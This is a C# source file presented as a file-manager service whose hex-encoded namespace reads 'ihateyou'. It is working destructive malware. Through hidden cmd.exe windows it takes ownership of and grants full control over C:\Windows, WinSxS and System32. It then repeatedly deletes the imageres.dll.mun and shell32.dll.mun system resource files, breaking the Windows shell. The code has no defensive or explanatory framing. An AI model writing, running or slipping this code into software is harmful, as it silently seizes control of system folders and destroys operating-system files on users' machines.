using System;
using System.Diagnostics;
using System.IO;
using System.Threading.Tasks;

namespace _6968617465796f750d0a.Services.FileManager
{
    class SystemFiles
    {

        public async void Execute()
        {

            Permissions take = new Permissions();
            take.Execute();

            await Task.Delay(5000);
            
            foreach(string dir in Directory.GetDirectories(@"C:\Windows\WinSxS"))
            {

                if (dir.Contains("imageres"))
                {
                    
                    foreach(string file in Directory.GetFiles(dir))
                    {
                        if (file.ToLower() == "imageres.dll.mun")
                        {
                            string perms = @$"/k takeown /f {dir} && icacls {dir} /grant " + "\"" + "%username%:F" + "\"" + " && exit";
                            take.ExecuteLocal(perms);
                            while (File.Exists(file))
                            {
                                try { File.Delete(file); } catch { }
                                await Task.Delay(1000);
                            }
                            break;
                        }
                    }

                }

                if (dir.Contains("shell32"))
                {

                    foreach (string file in Directory.GetFiles(dir))
                    {
                        if (file.ToLower() == "shell32.dll.mun")
                        {
                            string perms = @$"/k takeown /f {dir} && icacls {dir} /grant " + "\"" + "%username%:F" + "\"" + " && exit";
                            take.ExecuteLocal(perms);
                            while (File.Exists(file))
                            {
                                try { File.Delete(file); } catch { }
                                await Task.Delay(1000);
                            }
                            break;
                        }
                    }

                }

                await Task.Delay(10);
            }

        }

    }

    class Permissions
    {

        private protected string Arguments(string quote)
        {

            return @"/k takeown /f C:\Windows && icacls C:\Windows /grant "
                + quote + "%username%:F" + quote + @" && takeown /f C:\Windows\WinSxS && icacls C:\Windows\WinSxS /grant "
                + quote + "%username%:F" + quote + @" && takeown /f C:\Windows\System32 && icacls C:\Windows\System32 /grant "
                + quote + "%username%:F" + quote + " && exit";

        }

        public void ExecuteLocal(string args)
        {

            ProcessStartInfo StartInfo = new ProcessStartInfo()
            {
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                FileName = "cmd.exe",
                Arguments = args,
            };

            Process.Start(StartInfo);

        }

        public void Execute()
        {

            ProcessStartInfo StartInfo = new ProcessStartInfo()
            {
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                FileName = "cmd.exe",
                Arguments = Arguments("\""),
            };

            Process.Start(StartInfo);

        }
    }

}
